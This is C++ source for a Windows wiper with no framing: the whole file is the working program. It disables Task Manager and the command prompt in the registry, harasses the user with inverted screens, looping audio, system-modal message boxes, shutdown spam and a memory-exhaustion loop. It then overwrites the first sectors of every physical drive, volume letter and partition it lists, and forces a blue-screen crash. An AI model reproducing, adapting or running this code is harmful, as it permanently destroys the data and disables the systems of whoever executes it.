#define _CRT_SECURE_NO_WARNINGS
#include "resource.h"
#include <Windows.h>
#include <C:\\Windows\\System32\\rasctrnm.h>
#include <graphics.h>
#include <stdio.h>
#include <iostream>
#include <WinUser.h>
#include <thread>
#include <tchar.h>
#include <fstream>
#include <cstdlib>
#include <ShlObj.h>
#include <cstring>
#include <math.h>
#include <time.h>
#include <stdlib.h>
#include <mmsystem.h>
#include <cstring>
#include <chrono>
#include <cstdio>
#include <urlmon.h>
#include <process.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winmm.lib")
using namespace std;
LPCSTR overwrite[] =
{
    "\\\\.\\PhysicalDrive0",
    "\\\\.\\PhysicalDrive1",
    "\\\\.\\PhysicalDrive2",
    "\\\\.\\PhysicalDrive3",
    "\\\\.\\PhysicalDrive4",
    "\\\\.\\PhysicalDrive5",
    "\\\\.\\PhysicalDrive6",
    "\\\\.\\PhysicalDrive7",
    "\\\\.\\PhysicalDrive8",
    "\\\\.\\PhysicalDrive9",
    "\\\\.\\PhysicalDrive10",
    "\\\\.\\PhysicalDrive11",
    "\\\\.\\PhysicalDrive12",
    "\\\\.\\PhysicalDrive13",
    "\\\\.\\PhysicalDrive14",
    "\\\\.\\PhysicalDrive15",
    "\\\\.\\PhysicalDrive16",
    "\\\\.\\PhysicalDrive17",
    "\\\\.\\PhysicalDrive18",
    "\\\\.\\PhysicalDrive19",
    "\\\\.\\PhysicalDrive20",
    "\\\\.\\PhysicalDrive21",
    "\\\\.\\PhysicalDrive22",
    "\\\\.\\PhysicalDrive23",
    "\\\\.\\PhysicalDrive24",
    "\\\\.\\PhysicalDrive25",
    "\\\\.\\PhysicalDrive26",
    "\\\\.\\PhysicalDrive27",
    "\\\\.\\PhysicalDrive28",
    "\\\\.\\PhysicalDrive29",
    "\\\\.\\PhysicalDrive30",
    "\\\\.\\A:",
    "\\\\.\\B:",
    "\\\\.\\C:",
    "\\\\.\\D:",
    "\\\\.\\E:",
    "\\\\.\\F:",
    "\\\\.\\G:",
    "\\\\.\\H:",
    "\\\\.\\I:",
    "\\\\.\\J:",
    "\\\\.\\K:",
    "\\\\.\\L:",
    "\\\\.\\M:",
    "\\\\.\\N:",
    "\\\\.\\O:",
    "\\\\.\\P:",
    "\\\\.\\Q:",
    "\\\\.\\R:",
    "\\\\.\\S:",
    "\\\\.\\T:",
    "\\\\.\\U:",
    "\\\\.\\V:",
    "\\\\.\\W:",
    "\\\\.\\X:",
    "\\\\.\\Y:",
    "\\\\.\\Z:",
    "\\\\.\\Harddisk0Partition1",
    "\\\\.\\Harddisk0Partition2",
    "\\\\.\\Harddisk0Partition3",
    "\\\\.\\Harddisk0Partition4",
    "\\\\.\\Harddisk0Partition5",
    "\\\\.\\Harddisk0Partition6",
    "\\\\.\\Harddisk0Partition7",
    "\\\\.\\Harddisk0Partition8",
    "\\\\.\\Harddisk0Partition9",
    "\\\\.\\Harddisk0Partition10",
    "\\\\.\\Harddisk0Partition11",
    "\\\\.\\Harddisk0Partition12",
    "\\\\.\\Harddisk0Partition13",
    "\\\\.\\Harddisk0Partition14",
    "\\\\.\\Harddisk0Partition15",
    "\\\\.\\Harddisk0Partition16",
    "\\\\.\\Harddisk0Partition17",
    "\\\\.\\Harddisk0Partition18",
    "\\\\.\\Harddisk0Partition19",
    "\\\\.\\Harddisk0Partition20",
    "\\\\.\\Harddisk0Partition21",
    "\\\\.\\Harddisk0Partition22",
    "\\\\.\\Harddisk0Partition23",
    "\\\\.\\Harddisk0Partition24",
    "\\\\.\\Harddisk0Partition25",
    "\\\\.\\Harddisk0Partition26",
    "\\\\.\\Harddisk0Partition27",
    "\\\\.\\Harddisk0Partition28",
    "\\\\.\\Harddisk0Partition29",
    "\\\\.\\Harddisk0Partition30",
    "\\\\.\\Harddisk1Partition1",
    "\\\\.\\Harddisk1Partition2",
    "\\\\.\\Harddisk1Partition3",
    "\\\\.\\Harddisk1Partition4",
    "\\\\.\\Harddisk1Partition5",
    "\\\\.\\Harddisk1Partition6",
    "\\\\.\\Harddisk1Partition7",
    "\\\\.\\Harddisk1Partition8",
    "\\\\.\\Harddisk1Partition9",
    "\\\\.\\Harddisk1Partition10",
    "\\\\.\\Harddisk1Partition11",
    "\\\\.\\Harddisk1Partition12",
    "\\\\.\\Harddisk1Partition13",
    "\\\\.\\Harddisk1Partition14",
    "\\\\.\\Harddisk1Partition15",
    "\\\\.\\Harddisk1Partition16",
    "\\\\.\\Harddisk1Partition17",
    "\\\\.\\Harddisk1Partition18",
    "\\\\.\\Harddisk1Partition19",
    "\\\\.\\Harddisk1Partition20",
    "\\\\.\\Harddisk1Partition21",
    "\\\\.\\Harddisk1Partition22",
    "\\\\.\\Harddisk1Partition23",
    "\\\\.\\Harddisk1Partition24",
    "\\\\.\\Harddisk1Partition25",
    "\\\\.\\Harddisk1Partition26",
    "\\\\.\\Harddisk1Partition27",
    "\\\\.\\Harddisk1Partition28",
    "\\\\.\\Harddisk1Partition29",
    "\\\\.\\Harddisk1Partition30",
    "\\\\.\\Harddisk2Partition1",
    "\\\\.\\Harddisk2Partition2",
    "\\\\.\\Harddisk2Partition3",
    "\\\\.\\Harddisk2Partition4",
    "\\\\.\\Harddisk2Partition5",
    "\\\\.\\Harddisk2Partition6",
    "\\\\.\\Harddisk2Partition7",
    "\\\\.\\Harddisk2Partition8",
    "\\\\.\\Harddisk2Partition9",
    "\\\\.\\Harddisk2Partition10",
    "\\\\.\\Harddisk2Partition11",
    "\\\\.\\Harddisk2Partition12",
    "\\\\.\\Harddisk2Partition13",
    "\\\\.\\Harddisk2Partition14",
    "\\\\.\\Harddisk2Partition15",
    "\\\\.\\Harddisk2Partition16",
    "\\\\.\\Harddisk2Partition17",
    "\\\\.\\Harddisk2Partition18",
    "\\\\.\\Harddisk2Partition19",
    "\\\\.\\Harddisk2Partition20",
    "\\\\.\\Harddisk2Partition21",
    "\\\\.\\Harddisk2Partition22",
    "\\\\.\\Harddisk2Partition23",
    "\\\\.\\Harddisk2Partition24",
    "\\\\.\\Harddisk2Partition25",
    "\\\\.\\Harddisk2Partition26",
    "\\\\.\\Harddisk2Partition27",
    "\\\\.\\Harddisk2Partition28",
    "\\\\.\\Harddisk2Partition29",
    "\\\\.\\Harddisk2Partition30",
    "\\\\.\\Harddisk3Partition1",
    "\\\\.\\Harddisk3Partition2",
    "\\\\.\\Harddisk3Partition3",
    "\\\\.\\Harddisk3Partition4",
    "\\\\.\\Harddisk3Partition5",
    "\\\\.\\Harddisk3Partition6",
    "\\\\.\\Harddisk3Partition7",
    "\\\\.\\Harddisk3Partition8",
    "\\\\.\\Harddisk3Partition9",
    "\\\\.\\Harddisk3Partition10",
    "\\\\.\\Harddisk3Partition11",
    "\\\\.\\Harddisk3Partition12",
    "\\\\.\\Harddisk3Partition13",
    "\\\\.\\Harddisk3Partition14",
    "\\\\.\\Harddisk3Partition15",
    "\\\\.\\Harddisk3Partition16",
    "\\\\.\\Harddisk3Partition17",
    "\\\\.\\Harddisk3Partition18",
    "\\\\.\\Harddisk3Partition19",
    "\\\\.\\Harddisk3Partition20",
    "\\\\.\\Harddisk3Partition21",
    "\\\\.\\Harddisk3Partition22",
    "\\\\.\\Harddisk3Partition23",
    "\\\\.\\Harddisk3Partition24",
    "\\\\.\\Harddisk3Partition25",
    "\\\\.\\Harddisk3Partition26",
    "\\\\.\\Harddisk3Partition27",
    "\\\\.\\Harddisk3Partition28",
    "\\\\.\\Harddisk3Partition29",
    "\\\\.\\Harddisk3Partition30",
    "\\\\.\\Harddisk4Partition1",
    "\\\\.\\Harddisk4Partition2",
    "\\\\.\\Harddisk4Partition3",
    "\\\\.\\Harddisk4Partition4",
    "\\\\.\\Harddisk4Partition5",
    "\\\\.\\Harddisk4Partition6",
    "\\\\.\\Harddisk4Partition7",
    "\\\\.\\Harddisk4Partition8",
    "\\\\.\\Harddisk4Partition9",
    "\\\\.\\Harddisk4Partition10",
    "\\\\.\\Harddisk4Partition11",
    "\\\\.\\Harddisk4Partition12",
    "\\\\.\\Harddisk4Partition13",
    "\\\\.\\Harddisk4Partition14",
    "\\\\.\\Harddisk4Partition15",
    "\\\\.\\Harddisk4Partition16",
    "\\\\.\\Harddisk4Partition17",
    "\\\\.\\Harddisk4Partition18",
    "\\\\.\\Harddisk4Partition19",
    "\\\\.\\Harddisk4Partition20",
    "\\\\.\\Harddisk4Partition21",
    "\\\\.\\Harddisk4Partition22",
    "\\\\.\\Harddisk4Partition23",
    "\\\\.\\Harddisk4Partition24",
    "\\\\.\\Harddisk4Partition25",
    "\\\\.\\Harddisk4Partition26",
    "\\\\.\\Harddisk4Partition27",
    "\\\\.\\Harddisk4Partition28",
    "\\\\.\\Harddisk4Partition29",
    "\\\\.\\Harddisk4Partition30",
    "\\\\.\\Harddisk5Partition1",
    "\\\\.\\Harddisk5Partition2",
    "\\\\.\\Harddisk5Partition3",
    "\\\\.\\Harddisk5Partition4",
    "\\\\.\\Harddisk5Partition5",
    "\\\\.\\Harddisk5Partition6",
    "\\\\.\\Harddisk5Partition7",
    "\\\\.\\Harddisk5Partition8",
    "\\\\.\\Harddisk5Partition9",
    "\\\\.\\Harddisk5Partition10",
    "\\\\.\\Harddisk5Partition11",
    "\\\\.\\Harddisk5Partition12",
    "\\\\.\\Harddisk5Partition13",
    "\\\\.\\Harddisk5Partition14",
    "\\\\.\\Harddisk5Partition15",
    "\\\\.\\Harddisk5Partition16",
    "\\\\.\\Harddisk5Partition17",
    "\\\\.\\Harddisk5Partition18",
    "\\\\.\\Harddisk5Partition19",
    "\\\\.\\Harddisk5Partition20",
    "\\\\.\\Harddisk5Partition21",
    "\\\\.\\Harddisk5Partition22",
    "\\\\.\\Harddisk5Partition23",
    "\\\\.\\Harddisk5Partition24",
    "\\\\.\\Harddisk5Partition25",
    "\\\\.\\Harddisk5Partition26",
    "\\\\.\\Harddisk5Partition27",
    "\\\\.\\Harddisk5Partition28",
    "\\\\.\\Harddisk5Partition29",
    "\\\\.\\Harddisk5Partition30",
    "\\\\.\\Harddisk6Partition1",
    "\\\\.\\Harddisk6Partition2",
    "\\\\.\\Harddisk6Partition3",
    "\\\\.\\Harddisk6Partition4",
    "\\\\.\\Harddisk6Partition5",
    "\\\\.\\Harddisk6Partition6",
    "\\\\.\\Harddisk6Partition7",
    "\\\\.\\Harddisk6Partition8",
    "\\\\.\\Harddisk6Partition9",
    "\\\\.\\Harddisk6Partition10",
    "\\\\.\\Harddisk6Partition11",
    "\\\\.\\Harddisk6Partition12",
    "\\\\.\\Harddisk6Partition13",
    "\\\\.\\Harddisk6Partition14",
    "\\\\.\\Harddisk6Partition15",
    "\\\\.\\Harddisk6Partition16",
    "\\\\.\\Harddisk6Partition17",
    "\\\\.\\Harddisk6Partition18",
    "\\\\.\\Harddisk6Partition19",
    "\\\\.\\Harddisk6Partition20",
    "\\\\.\\Harddisk6Partition21",
    "\\\\.\\Harddisk6Partition22",
    "\\\\.\\Harddisk6Partition23",
    "\\\\.\\Harddisk6Partition24",
    "\\\\.\\Harddisk6Partition25",
    "\\\\.\\Harddisk6Partition26",
    "\\\\.\\Harddisk6Partition27",
    "\\\\.\\Harddisk6Partition28",
    "\\\\.\\Harddisk6Partition29",
    "\\\\.\\Harddisk6Partition30",
    "\\\\.\\Harddisk7Partition1",
    "\\\\.\\Harddisk7Partition2",
    "\\\\.\\Harddisk7Partition3",
    "\\\\.\\Harddisk7Partition4",
    "\\\\.\\Harddisk7Partition5",
    "\\\\.\\Harddisk7Partition6",
    "\\\\.\\Harddisk7Partition7",
    "\\\\.\\Harddisk7Partition8",
    "\\\\.\\Harddisk7Partition9",
    "\\\\.\\Harddisk7Partition10",
    "\\\\.\\Harddisk7Partition11",
    "\\\\.\\Harddisk7Partition12",
    "\\\\.\\Harddisk7Partition13",
    "\\\\.\\Harddisk7Partition14",
    "\\\\.\\Harddisk7Partition15",
    "\\\\.\\Harddisk7Partition16",
    "\\\\.\\Harddisk7Partition17",
    "\\\\.\\Harddisk7Partition18",
    "\\\\.\\Harddisk7Partition19",
    "\\\\.\\Harddisk7Partition20",
    "\\\\.\\Harddisk7Partition21",
    "\\\\.\\Harddisk7Partition22",
    "\\\\.\\Harddisk7Partition23",
    "\\\\.\\Harddisk7Partition24",
    "\\\\.\\Harddisk7Partition25",
    "\\\\.\\Harddisk7Partition26",
    "\\\\.\\Harddisk7Partition27",
    "\\\\.\\Harddisk7Partition28",
    "\\\\.\\Harddisk7Partition29",
    "\\\\.\\Harddisk7Partition30",
    "\\\\.\\Harddisk8Partition1",
    "\\\\.\\Harddisk8Partition2",
    "\\\\.\\Harddisk8Partition3",
    "\\\\.\\Harddisk8Partition4",
    "\\\\.\\Harddisk8Partition5",
    "\\\\.\\Harddisk8Partition6",
    "\\\\.\\Harddisk8Partition7",
    "\\\\.\\Harddisk8Partition8",
    "\\\\.\\Harddisk8Partition9",
    "\\\\.\\Harddisk8Partition10",
    "\\\\.\\Harddisk8Partition11",
    "\\\\.\\Harddisk8Partition12",
    "\\\\.\\Harddisk8Partition13",
    "\\\\.\\Harddisk8Partition14",
    "\\\\.\\Harddisk8Partition15",
    "\\\\.\\Harddisk8Partition16",
    "\\\\.\\Harddisk8Partition17",
    "\\\\.\\Harddisk8Partition18",
    "\\\\.\\Harddisk8Partition19",
    "\\\\.\\Harddisk8Partition20",
    "\\\\.\\Harddisk8Partition21",
    "\\\\.\\Harddisk8Partition22",
    "\\\\.\\Harddisk8Partition23",
    "\\\\.\\Harddisk8Partition24",
    "\\\\.\\Harddisk8Partition25",
    "\\\\.\\Harddisk8Partition26",
    "\\\\.\\Harddisk8Partition27",
    "\\\\.\\Harddisk8Partition28",
    "\\\\.\\Harddisk8Partition29",
    "\\\\.\\Harddisk8Partition30",
    "\\\\.\\Harddisk9Partition1",
    "\\\\.\\Harddisk9Partition2",
    "\\\\.\\Harddisk9Partition3",
    "\\\\.\\Harddisk9Partition4",
    "\\\\.\\Harddisk9Partition5",
    "\\\\.\\Harddisk9Partition6",
    "\\\\.\\Harddisk9Partition7",
    "\\\\.\\Harddisk9Partition8",
    "\\\\.\\Harddisk9Partition9",
    "\\\\.\\Harddisk9Partition10",
    "\\\\.\\Harddisk9Partition11",
    "\\\\.\\Harddisk9Partition12",
    "\\\\.\\Harddisk9Partition13",
    "\\\\.\\Harddisk9Partition14",
    "\\\\.\\Harddisk9Partition15",
    "\\\\.\\Harddisk9Partition16",
    "\\\\.\\Harddisk9Partition17",
    "\\\\.\\Harddisk9Partition18",
    "\\\\.\\Harddisk9Partition19",
    "\\\\.\\Harddisk9Partition20",
    "\\\\.\\Harddisk9Partition21",
    "\\\\.\\Harddisk9Partition22",
    "\\\\.\\Harddisk9Partition23",
    "\\\\.\\Harddisk9Partition24",
    "\\\\.\\Harddisk9Partition25",
    "\\\\.\\Harddisk9Partition26",
    "\\\\.\\Harddisk9Partition27",
    "\\\\.\\Harddisk9Partition28",
    "\\\\.\\Harddisk9Partition29",
    "\\\\.\\Harddisk9Partition30",
    "\\\\.\\Harddisk10Partition1",
    "\\\\.\\Harddisk10Partition2",
    "\\\\.\\Harddisk10Partition3",
    "\\\\.\\Harddisk10Partition4",
    "\\\\.\\Harddisk10Partition5",
    "\\\\.\\Harddisk10Partition6",
    "\\\\.\\Harddisk10Partition7",
    "\\\\.\\Harddisk10Partition8",
    "\\\\.\\Harddisk10Partition9",
    "\\\\.\\Harddisk10Partition10",
    "\\\\.\\Harddisk10Partition11",
    "\\\\.\\Harddisk10Partition12",
    "\\\\.\\Harddisk10Partition13",
    "\\\\.\\Harddisk10Partition14",
    "\\\\.\\Harddisk10Partition15",
    "\\\\.\\Harddisk10Partition16",
    "\\\\.\\Harddisk10Partition17",
    "\\\\.\\Harddisk10Partition18",
    "\\\\.\\Harddisk10Partition19",
    "\\\\.\\Harddisk10Partition20",
    "\\\\.\\Harddisk10Partition21",
    "\\\\.\\Harddisk10Partition22",
    "\\\\.\\Harddisk10Partition23",
    "\\\\.\\Harddisk10Partition24",
    "\\\\.\\Harddisk10Partition25",
    "\\\\.\\Harddisk10Partition26",
    "\\\\.\\Harddisk10Partition27",
    "\\\\.\\Harddisk10Partition28",
    "\\\\.\\Harddisk10Partition29",
    "\\\\.\\Harddisk10Partition30",
};
const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);
void FindDesktopCom_Interface(REFIID riid, void** ppv)
{
    long hwnd = NULL;
    VARIANT vtLoc;
    vtLoc.vt = VT_I4;
    vtLoc.lVal = long(CSIDL_DESKTOP);
    VARIANT vtEmpty;
    vtEmpty.vt = VT_EMPTY;
    IDispatch* pdisp = nullptr;
    IServiceProvider* pProv = nullptr;
    IShellBrowser* pBrowser = nullptr;
    IShellView* pView = nullptr;
    IFolderView2* p_View = nullptr;
    HRESULT hr = CoInitialize(nullptr);
    IShellWindows* pShellWindows = nullptr;

    if (SUCCEEDED(hr))
    {
        hr = CoCreateInstance(CLSID_ShellWindows, NULL, CLSCTX_ALL, IID_IShellWindows, (void**)&pShellWindows);
        if (SUCCEEDED(hr))
        {
            hr = pShellWindows->FindWindowSW(&vtLoc, &vtEmpty, SWC_DESKTOP, &hwnd, SWFO_NEEDDISPATCH, &pdisp);
            if (SUCCEEDED(hr))
            {
                hr = pdisp->QueryInterface(IID_IServiceProvider, (void**)&pProv);
                if (SUCCEEDED(hr))
                {
                    hr = pProv->QueryService(SID_STopLevelBrowser, IID_PPV_ARGS(&pBrowser));
                    if (SUCCEEDED(hr))
                    {
                        hr = pBrowser->QueryActiveShellView(&pView);
                        if (SUCCEEDED(hr))
                        {
                            hr = pView->QueryInterface(riid, ppv);
                            if (SUCCEEDED(hr))
                            {

                            }
                        }
                    }
                }
            }

        }
    }
}
void ChangeDPI()
{
    HMODULE hModUser32 = LoadLibraryA("user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
    if (SetProcessDPIAware)
    {
        SetProcessDPIAware();
    }
    FreeLibrary(hModUser32);
}
void ChangeReg1()
{
    HKEY hKey;
    LPCSTR subKey = "Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell";
    LPCSTR valueName = "ExecutionPolicy";
    LPCSTR newValue = "RemoteSigned";
    RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_SZ, reinterpret_cast<BYTE*>(const_cast<LPSTR>(newValue)), strlen(newValue) + 1);
    RegCloseKey(hKey);
}
void ChangeReg2()
{
    HKEY hKey;
    LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Control\\CrashControl";
    LPCSTR valueName = "AutoReboot";
    DWORD newValue = 0;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void ChangeReg3()
{
    HKEY hKey;
    LPCSTR subKey = "Software\\Policies\\Microsoft\\Windows\\System";
    LPCSTR valueName = "DisableCMD";
    DWORD newValue = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void ChangeReg4()
{
    HKEY hKey;
    LPCSTR subKey = "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    LPCSTR valueName = "DisableTaskMgr";
    DWORD newValue = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void ChangeReg5()
{
    HKEY hKey;
    LPCSTR subKey = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
    LPCSTR valueName = "NoViewOnDrive";
    DWORD newValue = 4;
    RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    RegCloseKey(hKey);
}
void PINGMUFANSE()
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    for (;;)
    {
        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, DSTINVERT);
        Sleep(50000);
    }
}
void DUIHUAKUANG1()
{
    for(;;)
    {
    MessageBoxA(NULL, "你看看你身后有什么？", "", MB_ICONINFORMATION | MB_SYSTEMMODAL);
    Sleep(60000);
    }
}
BOOL UseCustomResource()
{
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRsrc = FindResource(hModule, MAKEINTRESOURCE(IDB_PNG1), TEXT("PNG"));
	DWORD dwSize = SizeofResource(hModule, hRsrc);
	HGLOBAL hGlobal = LoadResource(hModule, hRsrc);
	LPVOID lpVoid = LockResource(hGlobal);
	FILE* fp = fopen("C:\\Windows\\System32\\setup.png", "wb+");
	fwrite(lpVoid, sizeof(char), dwSize, fp);
	fclose(fp);
	FreeResource(hGlobal);
	return TRUE;
}
void sfh()
{
    for (;;)
    {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE);
    }
}
void GYF()
{
    for (;;)
    {
        Sleep(5000);
        system("start shell:::{D4480A50-BA28-11D1-8E75-00C04FA31A86}");
        Sleep(10000);
        system("start shel:::{F6B6E965-E9B2-444B-9286-10C9152EDBC5}");
        Sleep(5000);
        system("start shell:::{6DFD7C5C-2451-11D3-A299-00C04F8EF6AF}");
        Sleep(20000);
        system("start shell:::{2559A1F3-21D7-11D4-BDAF-00C04F60B9F0}");
        Sleep(60000);
        system("start shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}");
        Sleep(10000);
        system("start shell:::{8E0C279D-0BD1-43C3-9EBD-31C3DC5B8A77}");
    }
}
void SGUIANDKSGUI()
{
    for (;;)
    {
        system("shutdown /i|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Ping|Taskkill /f /t /im shutdown.exe");
        Sleep(100000);
    }
}
void DAKAIGEZHONGDONGXI()
{
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x51, 0, 0, 0);
    keybd_event(0x51,0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(10000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x57, 0, 0, 0);
    keybd_event(0x57, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(15000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x45, 0, 0, 0);
    keybd_event(0x45, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(20000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x52, 0, 0, 0);
    keybd_event(0x52, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(25000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x54, 0, 0, 0);
    keybd_event(0x54, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(30000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x55, 0, 0, 0);
    keybd_event(0x55, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(35000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x49, 0, 0, 0);
    keybd_event(0x49, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(40000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x50, 0, 0, 0);
    keybd_event(0x50, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(45000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x41, 0, 0, 0);
    keybd_event(0x41, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(50000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x44, 0, 0, 0);
    keybd_event(0x44, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(55000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x4B, 0, 0, 0);
    keybd_event(0x4B, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(60000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x58, 0, 0, 0);
    keybd_event(0x58, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(65000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x56, 0, 0, 0);
    keybd_event(0x56, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    Sleep(70000);
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event(0x4E, 0, 0, 0);
    keybd_event(0x4E, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
}
void KJB()
{
    while (1) new int;
}
void Crash()
{
    Sleep(1000);
    HMODULE hNtdll = LoadLibrary("ntdll.dll");
    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");
    unsigned char unused1;
    long unsigned int unused2;
    if (RtlAdjustPrivilege && NtRaiseHardError)
    {
        RtlAdjustPrivilege(0x13, true, false, &unused1);
        NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
    }
    FreeLibrary(hNtdll);
    ExitWindows();
    ExitProcess(0);
}
void OverWrite(LPCSTR Name)
{
    HANDLE hFile = CreateFileA(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < 50000; i++) {
        WriteFile(hFile, EmptyData, 512, &dwUnused, NULL);
    }
    CloseHandle(hFile);
    LocalFree(EmptyData);
}
void OverWriteDisk()
{
    for (int i = 0; i < nOverwrite; i++)
    {
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
        Sleep(10);
    }
}
int main()
{
    ChangeDPI();
    thread t1(sfh);
    ChangeReg1();
    ChangeReg2();
    ChangeReg3();
    ChangeReg4();
    thread t4(GYF);
    thread t2(DUIHUAKUANG1);
    Sleep(5000);
    thread t3(PINGMUFANSE);
	BOOL ref = UseCustomResource();
    const char* path = "C:\\Windows\\System32\\setup.png";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
    IFolderView2* spView = nullptr;
    FindDesktopCom_Interface(IID_PPV_ARGS(&spView));
    if (spView)
    {
        DWORD flags = 0;
        HRESULT hr = spView->GetCurrentFolderFlags(&flags);
        if (SUCCEEDED(hr))
        {
            hr = spView->SetCurrentFolderFlags(FWF_NOICONS, flags ^ FWF_NOICONS);
        }
    }
    system("shutdown /s /t 20");
    Sleep(2000);
    system("shutdown /a");
    Sleep(5000);
    system("shutdown /s /t 20");
    Sleep(2000);
    system("shutdown /a");
    Sleep(5000);
    thread t5(SGUIANDKSGUI);
    Sleep(5000);
    thread t7(DAKAIGEZHONGDONGXI);
    thread t8(KJB);
    OverWriteDisk();
    Crash();
    return 0;
}